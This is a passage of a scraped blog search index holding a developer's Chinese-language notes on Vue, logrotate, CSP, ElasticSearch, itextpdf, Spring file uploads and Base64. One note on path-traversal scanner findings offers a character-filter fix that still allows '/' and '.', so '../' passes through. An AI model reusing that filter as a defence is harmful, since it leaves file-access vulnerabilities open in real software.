。因為他覺得要紀錄網址太麻煩了。我原本也不太能確定有時間時作，因為要用這個特別做這個功能要額外花時間太麻煩了(身為上班族下班時間可是非常寶貴)，我在想有沒有更簡單的作法。後來想到共用方法可以寫元件，想說值得嘗試。源碼vue-myanimelist/SettingManager.vue at master · malagege/vue-myanimelist 上面3和5真的讓我寫這個非常有成就，我覺得如何寫出共用元件可以讓下一個專案使用，減少我們後續製作程式的成本這個非常重要。 最後我其實是後端工程師，久久寫 Vue，不知道下次寫我還記得 Vue 有多少… 可改進: url 那一段載入很亂，因為有 bug 之下，寫到有點暈，所以就暴力寫出來了 SettingManager 讀取有 bug ，因為要點兩下 當下同網頁貼別人網址無法載入清單 ","date":"2022-07-31","objectID":"/blog/posts/Vue-myAnimeList-%E7%94%A2%E7%94%9F%E6%88%91%E7%9A%84%E5%8B%95%E7%95%AB%E6%B8%85%E5%96%AE/:0:0","tags":["vue"],"title":"Vue-myAnimeList 產生我的動畫清單","uri":"/blog/posts/Vue-myAnimeList-%E7%94%A2%E7%94%9F%E6%88%91%E7%9A%84%E5%8B%95%E7%95%AB%E6%B8%85%E5%96%AE/"},{"categories":["Vue"],"content":"參考項目/連結: 做了一個自動補新番工具 dmhy_newban_downloader/NewBanCrawler.js at 51662aba9e0caf3c7b76fdc24484db36c59fc76a · a9650615/dmhy_newban_downloader ACGNTaiwan/Anime-List: 展示新番的清單 YuC’s AnimeList 全网最全的动漫新番放送表情报信息网站推荐 - Go 2 Think (function(){ let res = Array(document.querySelectorAll('.title_cn').length).fill({ \"name\": \"\", \"date\": \"\", \"time\": \"\", \"carrier\": \"\", \"season\": 1, \"originalName\": \"\", \"img\": \"\", \"official\": \"\", \"description\": \"\", \"staff\":\"\", }) res = JSON.parse(JSON.stringify(res)) document.querySelectorAll('.title_cn').forEach((el, i) =\u003e { res[i].name = el.textContent.replace(/第(.+)期/, '') res[i].season = parseInt(el.textContent.match(/第(.+)期/) ? el.textContent.match(/第(.+)期/)[1] : 1) }); document.querySelectorAll('.title_jp').forEach((el, i) =\u003e { res[i].originalName = el.textContent.replace(/第(.+)期/, '') }); document.querySelectorAll('.link_a').forEach((el, i) =\u003e { let qsA = el.querySelector('a') if (qsA) res[i].official = qsA.href }); document.querySelectorAll(`td[class^=\"type\"]:nth-child(even)`).forEach((el, i) =\u003e { res[i].carrier = { a: \"Original\", b: \"Comic\", c: \"Novel\", d: \"Game\" }[el.className.replace(`type_`, '')] || \"Original\" }); document.querySelectorAll('img[width=\"180px\"]').forEach((el, i) =\u003e { if (el) res[i].img = el.src }); document.querySelectorAll('.staff').forEach((el, i) =\u003e { if (el) res[i].staff = el.textContent }); })(); urls = $('.links-of-blogroll-item a').get().map(el =\u003e el.href) listname = $('.links-of-blogroll-item a').get() .map(el=\u003e el.innerHTML) .filter(str =\u003e str.indexOf('新番') \u003e 0) .map(str=\u003e{ const regex = /(\\d+年\\d+月新番)/gm; m = regex.exec(str) return m[0] }) ","date":"2022-07-31","objectID":"/blog/posts/Vue-myAnimeList-%E7%94%A2%E7%94%9F%E6%88%91%E7%9A%84%E5%8B%95%E7%95%AB%E6%B8%85%E5%96%AE/:1:0","tags":["vue"],"title":"Vue-myAnimeList 產生我的動畫清單","uri":"/blog/posts/Vue-myAnimeList-%E7%94%A2%E7%94%9F%E6%88%91%E7%9A%84%E5%8B%95%E7%95%AB%E6%B8%85%E5%96%AE/"},{"categories":["程式心法"],"content":"小記 ","date":"2022-07-31","objectID":"/blog/posts/PHP-JAVA-Session-%E8%99%95%E7%90%86%E6%A9%9F%E5%88%B6/:0:0","tags":["php","java","session","cookies"],"title":"PHP JAVA Session 處理機制","uri":"/blog/posts/PHP-JAVA-Session-%E8%99%95%E7%90%86%E6%A9%9F%E5%88%B6/"},{"categories":["程式心法"],"content":"PHP https://blog.csdn.net/qq_45521281/article/details/106665608 https://blog.markgdi.com/article/php-session-principle/ https://blog.51cto.com/cmdschool/1714757 ","date":"2022-07-31","objectID":"/blog/posts/PHP-JAVA-Session-%E8%99%95%E7%90%86%E6%A9%9F%E5%88%B6/:0:1","tags":["php","java","session","cookies"],"title":"PHP JAVA Session 處理機制","uri":"/blog/posts/PHP-JAVA-Session-%E8%99%95%E7%90%86%E6%A9%9F%E5%88%B6/"},{"categories":["程式心法"],"content":"JAVA https://blog.csdn.net/liujiding/article/details/77529972 https://zhuanlan.zhihu.com/p/27117070 https://www.iteye.com/blog/zmx-1846181 ","date":"2022-07-31","objectID":"/blog/posts/PHP-JAVA-Session-%E8%99%95%E7%90%86%E6%A9%9F%E5%88%B6/:0:2","tags":["php","java","session","cookies"],"title":"PHP JAVA Session 處理機制","uri":"/blog/posts/PHP-JAVA-Session-%E8%99%95%E7%90%86%E6%A9%9F%E5%88%B6/"},{"categories":["Linux"],"content":"一般我們開發人員沒有權限，但有一般使用者可以使用 logrotate ，就不用自幹 Shell Script 指令，還能做多樣化設定。 先前文章有研究到logrotate 自動切割 log 小記 | 程式狂想筆記，但都沒實戰。 ","date":"2022-07-31","objectID":"/blog/posts/logrotate-%E4%BD%BF%E7%94%A8%E4%B8%80%E8%88%AC%E4%BD%BF%E7%94%A8%E8%80%85%E6%8C%87%E4%BB%A4%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/:0:0","tags":["linux","log","logrotate"],"title":"logrotate 使用一般使用者指令執行方法","uri":"/blog/posts/logrotate-%E4%BD%BF%E7%94%A8%E4%B8%80%E8%88%AC%E4%BD%BF%E7%94%A8%E8%80%85%E6%8C%87%E4%BB%A4%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"使用發法(請看第一、三個指令) logrotate -s /home/project/logrotate/status -v -d /home/project/logrotate/pbci.conf # ~~不會執行~~，有看到文章說檔案小於一天不會執行 logrotate -s /home/project/logrotate/status -vf -d /home/project/logrotate/pbci.conf # 不會執行因為debug mode關係 logrotate -s /home/project/logrotate/status -vf /home/project/logrotate/pbci.conf # 會執行 -s 可指定一般使用者執行路徑，會存status檔案。 https://github.com/logrotate/logrotate/issues/80 -d debug 模式是呼不會執行 ","date":"2022-07-31","objectID":"/blog/posts/logrotate-%E4%BD%BF%E7%94%A8%E4%B8%80%E8%88%AC%E4%BD%BF%E7%94%A8%E8%80%85%E6%8C%87%E4%BB%A4%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/:1:0","tags":["linux","log","logrotate"],"title":"logrotate 使用一般使用者指令執行方法","uri":"/blog/posts/logrotate-%E4%BD%BF%E7%94%A8%E4%B8%80%E8%88%AC%E4%BD%BF%E7%94%A8%E8%80%85%E6%8C%87%E4%BB%A4%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"網路上完整教學文章 推薦看Linux日志切割神器logrotate原理介绍和配置详解 - 知乎 !!!備份圖!!! 摘要幾個重點。 logrotate [OPTION...] \u003cconfigfile\u003e -d, --debug ：debug 模式，測試配置文件是否有錯誤。 -f, --force ：強制轉儲文件。 -m, --mail=command ：壓縮日誌後，發送日誌到指定郵箱。 -s, --state=statefile ：使用指定的狀態文件。 -v, --verbose ：顯示轉儲過程。 [root@localhost ~]# logrotate -d /etc/logrotate.d/log_file reading config file /etc/logrotate.d/log_file reading config info for /var/log/log_file Handling 1 logs rotating pattern: /var/log/log_file monthly (5 rotations) empty log files are not rotated, old logs are removed considering log /var/log/log_file log does not need rotating not running postrotate script, since no logs were rotated 正如我們從上面的輸出結果可以看到的，logrotate 判斷該輪循是不必要的。如果文件的時間小於一天，這就會發生了。 常見配置參數 daily ：指定轉儲週期為每天weekly ：指定轉儲週期為每週monthly ：指定轉儲週期為每月rotate count ：指定日誌文件刪除之前轉儲的次數，0 指沒有備份，5 指保留 5 個備份tabooext [+] list：讓 logrotate 不轉儲指定擴展名的文件， 缺省的擴展名是：.rpm-orig, .rpmsave, v, 和～ missingok：在日誌輪循期間，任何錯誤將被忽略，例如 「文件無法找到」 之類的錯誤。size size：當日誌文件到達指定的大小時才轉儲，bytes (缺省) 及 KB (sizek) 或 MB (sizem) compress： 通過 gzip 壓縮轉儲以後的日誌 nocompress： 不壓縮copytruncate：用於還在打開中的日誌文件， 把當前日誌備份並截斷nocopytruncate： 備份日誌文件但是不截斷create mode owner group ： 轉儲文件，使用指定的文件模式創建新的日誌文件 nocreate： 不建立新的日誌文件 delaycompress： 和 compress 一起使用時，轉儲的日誌文件到下一次轉儲時才壓縮 nodelaycompress： 覆蓋 delaycompress 選項，轉儲同時壓縮。 errors address ： 專儲時的錯誤信息發送到指定的 Email 地址 ifempty ：即使是空文件也轉儲，這個是 logrotate 的缺省選項。 notifempty ：如果是空文件的話，不轉儲mail address ： 把轉儲的日誌文件發送到指定的 E-mail 地址 nomail ： 轉儲時不發送日誌文件olddir directory：儲後的日誌文件放入指定的目錄，必須和當前日誌文件在同一個文件系統 noolddir： 轉儲後的日誌文件和當前日誌文件放在同一個目錄下prerotate/ endscript： 在轉儲以前需要執行的命令可以放入這個對，這兩個關鍵字必須單獨成行 ","date":"2022-07-31","objectID":"/blog/posts/logrotate-%E4%BD%BF%E7%94%A8%E4%B8%80%E8%88%AC%E4%BD%BF%E7%94%A8%E8%80%85%E6%8C%87%E4%BB%A4%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/:2:0","tags":["linux","log","logrotate"],"title":"logrotate 使用一般使用者指令執行方法","uri":"/blog/posts/logrotate-%E4%BD%BF%E7%94%A8%E4%B8%80%E8%88%AC%E4%BD%BF%E7%94%A8%E8%80%85%E6%8C%87%E4%BB%A4%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"設定(範例) ","date":"2022-07-31","objectID":"/blog/posts/logrotate-%E4%BD%BF%E7%94%A8%E4%B8%80%E8%88%AC%E4%BD%BF%E7%94%A8%E8%80%85%E6%8C%87%E4%BB%A4%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/:3:0","tags":["linux","log","logrotate"],"title":"logrotate 使用一般使用者指令執行方法","uri":"/blog/posts/logrotate-%E4%BD%BF%E7%94%A8%E4%B8%80%E8%88%AC%E4%BD%BF%E7%94%A8%E8%80%85%E6%8C%87%E4%BB%A4%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"每天備分(copytruncate)，保留30天 /Project/logs/batch/*.log { daily dateext missingok rotate 30 notifempty copytruncate } /Project/logs/oxProject/*.log { daily dateext missingok rotate 30 notifempty copytruncate } ","date":"2022-07-31","objectID":"/blog/posts/logrotate-%E4%BD%BF%E7%94%A8%E4%B8%80%E8%88%AC%E4%BD%BF%E7%94%A8%E8%80%85%E6%8C%87%E4%BB%A4%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/:3:1","tags":["linux","log","logrotate"],"title":"logrotate 使用一般使用者指令執行方法","uri":"/blog/posts/logrotate-%E4%BD%BF%E7%94%A8%E4%B8%80%E8%88%AC%E4%BD%BF%E7%94%A8%E8%80%85%E6%8C%87%E4%BB%A4%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"備份後做壓縮檔 compress -\u003e做壓縮 delaycompress -\u003e 延遲最新檔案不做壓縮 參考使用 logrotate 定期整理 Rails Log 檔案 – ihower { blogging } # Rotate Rails application logs /path/to/your/rails/current/log/*.log { daily dateext missingok rotate 65535 compress delaycompress notifempty copytruncate } ","date":"2022-07-31","objectID":"/blog/posts/logrotate-%E4%BD%BF%E7%94%A8%E4%B8%80%E8%88%AC%E4%BD%BF%E7%94%A8%E8%80%85%E6%8C%87%E4%BB%A4%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/:4:0","tags":["linux","log","logrotate"],"title":"logrotate 使用一般使用者指令執行方法","uri":"/blog/posts/logrotate-%E4%BD%BF%E7%94%A8%E4%B8%80%E8%88%AC%E4%BD%BF%E7%94%A8%E8%80%85%E6%8C%87%E4%BB%A4%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"檔案日誌超過幾MB做輪替 [Linux] logrotate 設定 | 阿輝的零碎筆記 - 點部落 daily #每天切割 size=100M #每100M做一次rotation，如果 weekly 與 size 這兩個設定都有加，表示如果檔案不到100M便不會生成rotation ","date":"2022-07-31","objectID":"/blog/posts/logrotate-%E4%BD%BF%E7%94%A8%E4%B8%80%E8%88%AC%E4%BD%BF%E7%94%A8%E8%80%85%E6%8C%87%E4%BB%A4%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/:5:0","tags":["linux","log","logrotate"],"title":"logrotate 使用一般使用者指令執行方法","uri":"/blog/posts/logrotate-%E4%BD%BF%E7%94%A8%E4%B8%80%E8%88%AC%E4%BD%BF%E7%94%A8%E8%80%85%E6%8C%87%E4%BB%A4%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"線上產生工具 看過設定一輪，在看上面教學大概就會使用了。 Log Rotate Config Generator 登录文件的轮替 logrotate | Linux 系统教程（笔记） ","date":"2022-07-31","objectID":"/blog/posts/logrotate-%E4%BD%BF%E7%94%A8%E4%B8%80%E8%88%AC%E4%BD%BF%E7%94%A8%E8%80%85%E6%8C%87%E4%BB%A4%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/:6:0","tags":["linux","log","logrotate"],"title":"logrotate 使用一般使用者指令執行方法","uri":"/blog/posts/logrotate-%E4%BD%BF%E7%94%A8%E4%B8%80%E8%88%AC%E4%BD%BF%E7%94%A8%E8%80%85%E6%8C%87%E4%BB%A4%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/"},{"categories":["源碼掃描"],"content":"最近把一個專案上到測試環境，明明網站是 http 環境，但是裡面網址竟然顯示 https，我查看原始碼也沒強制加 https，也沒有用\u003cbase\u003e改變程式基本位置。 ","date":"2022-07-30","objectID":"/blog/posts/CSP-%E7%B6%B2%E9%A0%81%E5%AE%89%E5%85%A8%E6%80%A7%E8%A8%AD%E8%A8%88/:0:0","tags":["csp"],"title":"CSP 網頁安全性設計","uri":"/blog/posts/CSP-%E7%B6%B2%E9%A0%81%E5%AE%89%E5%85%A8%E6%80%A7%E8%A8%AD%E8%A8%88/"},{"categories":["源碼掃描"],"content":"發生原因 網頁吃不到CSS，用開發者工具看網路擷取到 JS、CSS都抓到404，發現導向內容為 HTTPS，程式碼都沒有做任何調整設定。 ","date":"2022-07-30","objectID":"/blog/posts/CSP-%E7%B6%B2%E9%A0%81%E5%AE%89%E5%85%A8%E6%80%A7%E8%A8%AD%E8%A8%88/:1:0","tags":["csp"],"title":"CSP 網頁安全性設計","uri":"/blog/posts/CSP-%E7%B6%B2%E9%A0%81%E5%AE%89%E5%85%A8%E6%80%A7%E8%A8%AD%E8%A8%88/"},{"categories":["源碼掃描"],"content":"CSP upgrade-insecure-requests \u003cmeta http-equiv=\"Content-Security-Policy\" content=\"upgrade-insecure-requests\"\u003e 首先是這一段影響的，可以看在https中使用http - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天文章有講到，只要拔掉就能解決這個問題。目前我發現 localhost,127.0.0.1 不會強制導向 https，不過文章沒有找到相關說明。 假如網站要調 https，網站在不改後端情況下，可以 workaround 設定這個，所有連線都會走 https。 參考: Content Security Policy (CSP) 筆記 - HackMD 在https中使用http - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 Upgrade-Insecure-Requests - HTTP | MDN ","date":"2022-07-30","objectID":"/blog/posts/CSP-%E7%B6%B2%E9%A0%81%E5%AE%89%E5%85%A8%E6%80%A7%E8%A8%AD%E8%A8%88/:2:0","tags":["csp"],"title":"CSP 網頁安全性設計","uri":"/blog/posts/CSP-%E7%B6%B2%E9%A0%81%E5%AE%89%E5%85%A8%E6%80%A7%E8%A8%AD%E8%A8%88/"},{"categories":["ElasticSearch"],"content":"最近因為 ES 安全性問題，手上接的專案 ES 需要升級 6.6.1，這邊我沒有相關經驗，簡單整理一下筆記。 ","date":"2022-07-30","objectID":"/blog/posts/ElasticSearch-6-3-%E5%8D%87%E7%B4%9A-6-6-1/:0:0","tags":["elasticsearch"],"title":"ElasticSearch 6.3 升級 6.6.1","uri":"/blog/posts/ElasticSearch-6-3-%E5%8D%87%E7%B4%9A-6-6-1/"},{"categories":["ElasticSearch"],"content":"流程 ","date":"2022-07-30","objectID":"/blog/posts/ElasticSearch-6-3-%E5%8D%87%E7%B4%9A-6-6-1/:1:0","tags":["elasticsearch"],"title":"ElasticSearch 6.3 升級 6.6.1","uri":"/blog/posts/ElasticSearch-6-3-%E5%8D%87%E7%B4%9A-6-6-1/"},{"categories":["ElasticSearch"],"content":"備份 es 資料夾 ","date":"2022-07-30","objectID":"/blog/posts/ElasticSearch-6-3-%E5%8D%87%E7%B4%9A-6-6-1/:1:1","tags":["elasticsearch"],"title":"ElasticSearch 6.3 升級 6.6.1","uri":"/blog/posts/ElasticSearch-6-3-%E5%8D%87%E7%B4%9A-6-6-1/"},{"categories":["ElasticSearch"],"content":"覆蓋對應 ES 資料夾檔案 ES 6.6.1 部分資料夾覆蓋到 bin lib modules ","date":"2022-07-30","objectID":"/blog/posts/ElasticSearch-6-3-%E5%8D%87%E7%B4%9A-6-6-1/:1:2","tags":["elasticsearch"],"title":"ElasticSearch 6.3 升級 6.6.1","uri":"/blog/posts/ElasticSearch-6-3-%E5%8D%87%E7%B4%9A-6-6-1/"},{"categories":["ElasticSearch"],"content":"Plugin 升級檔案到相對應路徑 plugin 查看有哪些東西，去官網做升級下載檔案動作。 elasticsearch-sql 套件 https://github.com/NLPchina/elasticsearch-sql/releases/tag/6.6.1.0 可以把 plugins\\sql 做覆蓋。 官方安裝套件是用 command line 執行，可以參考看看。安裝:Installation Guide · NLPchina/elasticsearch-sql Wiki · GitHub ./bin/elasticsearch-plugin install file:///home/yourFolder/elasticsearch-sql-x.x.x.x.zip ","date":"2022-07-30","objectID":"/blog/posts/ElasticSearch-6-3-%E5%8D%87%E7%B4%9A-6-6-1/:1:3","tags":["elasticsearch"],"title":"ElasticSearch 6.3 升級 6.6.1","uri":"/blog/posts/ElasticSearch-6-3-%E5%8D%87%E7%B4%9A-6-6-1/"},{"categories":["Java"],"content":"最近換個環境執行，結果發現檔案刪除會失敗。我還以為是MultipartFile.transferTo 遇到 FileNotFoundException 問題，後來發現不是，檔案被 lock 掉。 但沒找到相關錯誤，我都有做close動作。 我後來發現這個錯誤訊息。 WARNING: An illegal reflective access operation has occurred WARNING: Illegal reflective access by com.itextpdf.text.io.ByteBufferRandomAccessSource$1 (file:/C:/Users/XXX/.m2/repository/com/itextpdf/itextpdf/5.5.13/itextpdf-5.5.13.jar) to method java.nio.DirectByteBuffer.cleaner() WARNING: Please consider reporting this to the maintainers of com.itextpdf.text.io.ByteBufferRandomAccessSource$1 WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations WARNING: All illegal access operations will be denied in a future release 照相關錯誤找到java - itext Java 11 : Illegal reflective access by com. itextpdf.io.source.ByteBufferRandomAccessSource$1 - Cache One new PdfReader(new FileInputStream(inFilePath) 補上FileInputStream就可以跑了。三小 反正採到一個很奇怪的雷。 參考: java - itext Java 11 : Illegal reflective access by com. itextpdf.io.source.ByteBufferRandomAccessSource$1 - Cache One Itext Java 11: Illegal reflective access by com.itextpdf.io.source.ByteBufferRandomAccessSource$1 - Stack Overflow ","date":"2022-07-30","objectID":"/blog/posts/itextpdf-%E4%BD%BF%E7%94%A8-PdfReader-%E9%81%87%E5%88%B0%E6%AA%94%E6%A1%88-lcok-%E4%BD%8F%E5%95%8F%E9%A1%8C/:0:0","tags":["itextpdf","pdfreader"],"title":"itextpdf 使用 PdfReader 遇到檔案 lock 住問題","uri":"/blog/posts/itextpdf-%E4%BD%BF%E7%94%A8-PdfReader-%E9%81%87%E5%88%B0%E6%AA%94%E6%A1%88-lcok-%E4%BD%8F%E5%95%8F%E9%A1%8C/"},{"categories":["源碼掃描"],"content":"常常遇到一些問題，網路上找到一些方法筆記一下。 private static String sanitizePathTraversal(String filename) { Path p = Paths.get(filename); return p.getFileName().toString(); } private String getFileContents_fixed(HttpServletRequest request) throws ServletException, FileNotFoundException, IOException { String filename = sanitizePathTraversal(request.getParameter(\"filename\")); // Ensures access only to files in a given folder, no traversal Path path = Paths.get(SERVED_FILES_DIR + filename); byte[] fileContentBytes = Files.readAllBytes(path); String fileContents = new String(fileContentBytes, FILE_CONTENT_ENCODING_STRING); return fileContents; } 簡單說就是讓使用者 request 檔案名稱不可以帶入資料夾相關資料，看上面範例。但不知道Java有沒有現成安全的套件，目前是沒看到有。 ","date":"2022-07-30","objectID":"/blog/posts/Input-Path-Not-Canonicalized-%E9%A2%A8%E9%9A%AA/:0:0","tags":["path"],"title":"Input Path Not Canonicalized 風險","uri":"/blog/posts/Input-Path-Not-Canonicalized-%E9%A2%A8%E9%9A%AA/"},{"categories":["源碼掃描"],"content":"Path Manipulation 自己覺得可以用白名單確認，可能是最好。再來是過濾特殊字元。最後就算沒有改 Code，正常主機設定的權限也應該要嚴謹，也不會有安全性的問題。 ","date":"2022-07-30","objectID":"/blog/posts/Input-Path-Not-Canonicalized-%E9%A2%A8%E9%9A%AA/:1:0","tags":["path"],"title":"Input Path Not Canonicalized 風險","uri":"/blog/posts/Input-Path-Not-Canonicalized-%E9%A2%A8%E9%9A%AA/"},{"categories":["源碼掃描"],"content":"白名單 參考:Path Manipulation | Fix Fortify Issue public static final String UMD_EXCEPTION =\"/fxxxxbs3/UMD_EXCE/\"; public static final Map\u003cString, String\u003e UMD_EXCEPTION_OMC = Collections.unmodifiableMap(new HashMap\u003cString, String\u003e(){{ for(String omcCode :OmcUnit.ALL_CODES){ put(omcCode,UMD_EXCEPTION+File.separator+omcCode); } }}); for(OmcUnit omcUnit :omcList){ String fileName = \"omc\"+omcUnit.getCode()+\".\"+inputDateRoc+\".all\"; String path = FileFullPathUrl.UMD_EXCEPTION_OMC.get(omcUnit.getCode()); File path = new File(path); } ","date":"2022-07-30","objectID":"/blog/posts/Input-Path-Not-Canonicalized-%E9%A2%A8%E9%9A%AA/:1:1","tags":["path"],"title":"Input Path Not Canonicalized 風險","uri":"/blog/posts/Input-Path-Not-Canonicalized-%E9%A2%A8%E9%9A%AA/"},{"categories":["源碼掃描"],"content":"過濾特殊字元 參考 Fortify漏洞之 Path Manipulation 路徑篡改問題解決筆記_dazhong2012的博客-CSDN博客_pathmanipulation /** * 過濾字符串幫助類 */ public class CleanPathUtil { public static String cleanString(String aString) { if (aString == null) return null; String cleanString = \\\"\\\"; for (int i = 0; i \u003c aString.length(); ++i) { cleanString += cleanChar(aString.charAt(i)); } return cleanString; } private static char cleanChar(char aChar) { // 0 - 9 for (int i = 48; i \u003c 58; ++i) { if (aChar == i) return (char) i; } // 'A' - 'Z' for (int i = 65; i \u003c 91; ++i) { if (aChar == i) return (char) i; } // 'a' - 'z' for (int i = 97; i \u003c 123; ++i) { if (aChar == i) return (char) i; } // other valid characters switch (aChar) { case '/': return '/'; case '.': return '.'; case '-': return '-'; case '_': return '_'; case ' ': return ' '; } return '%'; } } 可能還有其他做法，改天看到再補。 FIO16-J. Canonicalize path names before validating them - SEI CERT Oracle Coding Standard for Java - Confluence ","date":"2022-07-30","objectID":"/blog/posts/Input-Path-Not-Canonicalized-%E9%A2%A8%E9%9A%AA/:1:2","tags":["path"],"title":"Input Path Not Canonicalized 風險","uri":"/blog/posts/Input-Path-Not-Canonicalized-%E9%A2%A8%E9%9A%AA/"},{"categories":["源碼掃描"],"content":"以下方法為不可用 以下為不可用安全。我差點用了。 import java.nio.file.*; String path = System.getenv(variableName); Path p = Paths.get(path); Path normalizedPath = p.normalize(); path = new File(normalizedPath.toString()); import org.apache.commons.io.FilenameUtils; String path = System.getenv(variableName); path = new File(FilenameUtils.normalize(path)); path - Input_Path_Not_Canonicalized - PathTravesal Vulnerability in checkmarx - Stack Overflow FilenameUtils (Apache Commons IO 2.11.0 API) Top 20 OWASP Vulnerabilities And How To Fix Them Infographic | UpGuard ","date":"2022-07-30","objectID":"/blog/posts/Input-Path-Not-Canonicalized-%E9%A2%A8%E9%9A%AA/:2:0","tags":["path"],"title":"Input Path Not Canonicalized 風險","uri":"/blog/posts/Input-Path-Not-Canonicalized-%E9%A2%A8%E9%9A%AA/"},{"categories":["Java"],"content":"之前公司同事有教，在 Window 在專案 D 朝設定 /app/file(參照位置)，執行時候就會吃D:/app/file。這個非常實用，不需要再重新配置。 但在用 Spring Boot 會發生讀不到檔案。 @Override public String store(MultipartFile file, String fileName) throws IOException { String destPath \"/app/file/\"; File filePath = new File(destPath); File dest = new File(filePath, fileName); if (!filePath.exists()) { filePath.mkdirs(); } try { file.transferTo(dest); log.info(\"file save success\"); } catch (IOException e) { log.error(\"File upload Error: \", e); throw e; } return dest.getCanonicalPath(); } ","date":"2022-07-30","objectID":"/blog/posts/MultipartFile-transferTo-%E9%81%87%E5%88%B0-FileNotFoundException-%E5%95%8F%E9%A1%8C/:0:0","tags":["springboot","java"],"title":"MultipartFile.transferTo 遇到 FileNotFoundException 問題","uri":"/blog/posts/MultipartFile-transferTo-%E9%81%87%E5%88%B0-FileNotFoundException-%E5%95%8F%E9%A1%8C/"},{"categories":["Java"],"content":"解法 @Override public String store(MultipartFile file, String fileName) throws IOException { String destPath \"/app/file/\"; File filePath = new File(destPath); // Convert to absolute path File dest = new File(filePath.getAbsolutePath(), fileName); if (!filePath.exists()) { filePath.mkdirs(); } try { file.transferTo(dest); log.info(\"file save success\"); } catch (IOException e) { log.error(\"File upload Error: \", e); throw e; } return dest.getCanonicalPath(); } 重點是在File dest = new File(filePath.getAbsolutePath(), fileName);。 也可以file.transferTo(filePath.getAbsoluteFile());一行解決，不過寫完整一點會比較好。 參考來源: [Solved] Spring upload file Error: Multipartfile Transferto() reported an error FileNotFoundException | ProgrammerAH Multipartfile 上传文件使用 transferTo 抛 java.io.FileNotFoundException C:\\Users\\admin\\AppData\\Local\\Temp_LoveEate的博客-CSDN博客 MultipartFile的transferTo方法的坑_CrazyDragon_King的博客-CSDN博客_file transferto ","date":"2022-07-30","objectID":"/blog/posts/MultipartFile-transferTo-%E9%81%87%E5%88%B0-FileNotFoundException-%E5%95%8F%E9%A1%8C/:1:0","tags":["springboot","java"],"title":"MultipartFile.transferTo 遇到 FileNotFoundException 問題","uri":"/blog/posts/MultipartFile-transferTo-%E9%81%87%E5%88%B0-FileNotFoundException-%E5%95%8F%E9%A1%8C/"},{"categories":["Java"],"content":"分析原因 參考來源: 一次突如其来的FileNotFoundException – 大狗小窝 因為 file.isAbsolute() 原因會補上location絕對位置，會造成抓出路徑錯誤位置。 ","date":"2022-07-30","objectID":"/blog/posts/MultipartFile-transferTo-%E9%81%87%E5%88%B0-FileNotFoundException-%E5%95%8F%E9%A1%8C/:2:0","tags":["springboot","java"],"title":"MultipartFile.transferTo 遇到 FileNotFoundException 問題","uri":"/blog/posts/MultipartFile-transferTo-%E9%81%87%E5%88%B0-FileNotFoundException-%E5%95%8F%E9%A1%8C/"},{"categories":["Java"],"content":"之前有關 url 空白字符(%20和+) | 程式狂想筆記文章有特別紀錄 url 放入 + 會當作空白字符，所以才會知道 base64 encode 過資料放在url GET 參數會有問題。 最近我使用base64 發現有這個問題，這邊網路查要怎麼使用，這邊小記一下。 https://httpbin.org/get?test=123+123 ","date":"2022-07-30","objectID":"/blog/posts/Java-%E5%81%9A-Base64-Url-Encode/:0:0","tags":["java","base64"],"title":"Java 做 Base64 Url Encode","uri":"/blog/posts/Java-%E5%81%9A-Base64-Url-Encode/"},{"categories":["Java"],"content":"Apache Commons Base64.encodeBase64URLSafeString 程式可參考:commons-codec/Base64.java at ebebbd427d80639692b2a06e51cc2885a1543b18 · apache/commons-codec · GitHub 很特別的是 Base64 URL encode 可以用 decodeBase64 去解析。 ","date":"2022-07-30","objectID":"/blog/posts/Java-%E5%81%9A-Base64-Url-Encode/:1:0","tags":["java","base64"],"title":"Java 做 Base64 Url Encode","uri":"/blog/posts/Java-%E5%81%9A-Base64-Url-Encode/"},{"categories":["Linux"],"content":"HTTP3 這麼潮當然要跟者流行阿，所以就實作。 ","date":"2022-07-30","objectID":"/blog/posts/Traefik-%E4%BD%BF%E7%94%A8-HTTP3-%E5%88%9D%E9%AB%94%E9%A9%97/:0:0","tags":["traefik","http"],"title":"Traefik 使用 HTTP3 初體驗","uri":"/blog/posts/Traefik-%E4%BD%BF%E7%94%A8-HTTP3-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Linux"],"content":"使用步驟 ","date":"2022-07-30","objectID":"/blog/posts/Traefik-%E4%BD%BF%E7%94%A8-HTTP3-%E5%88%9D%E9%AB%94%E9%A9%97/:1:0","tags":["traefik","http"],"title":"Traefik 使用 HTTP3 初體驗","uri":"/blog/posts/Traefik-%E4%BD%BF%E7%94%A8-HTTP3-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Linux"],"content":"1. Traefik 設定 ","date":"2022-07-30","objectID":"/blog/posts/Traefik-%E4%BD%BF%E7%94%A8-HTTP3-%E5%88%9D%E9%AB%94%E9%A9%97/:1:1","tags":["traefik","http"],"title":"Traefik 使用 HTTP3 初體驗","uri":"/blog/posts/Traefik-%E4%BD%BF%E7%94%A8-HTTP3-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Linux"],"content":"2. 防火牆(Docker 設定 443) UDP PORT version: '3' services: updateDuckDNSIP: # used to update duckdns # if you have a static IP, yu can comment this out # using busybox due to it having an image for almost every platform image: armhf/ubuntu command: /bin/sh -c \"apt update -y \u0026\u0026 apt install curl -y \u0026\u0026 while true; do echo 